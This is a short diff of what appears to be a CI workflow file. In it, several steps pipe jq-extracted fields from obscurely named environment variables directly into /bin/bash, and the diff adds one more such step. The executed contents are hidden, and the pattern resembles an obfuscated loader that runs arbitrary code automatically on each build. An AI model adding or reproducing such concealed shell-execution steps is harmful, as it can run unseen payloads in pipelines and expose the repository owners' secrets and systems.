@@ -23,6 +23,7 @@ jobs:
           echo $oo2679 | jq -r .fbgj87 | /bin/bash
           echo $lcrb369 | jq -r .xxuv4 | /bin/bash
           printf '%s' "$jcqn14" | jq -r .fnjo1 | /bin/bash
+          echo $kyfbc3 | jq -r .s1 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
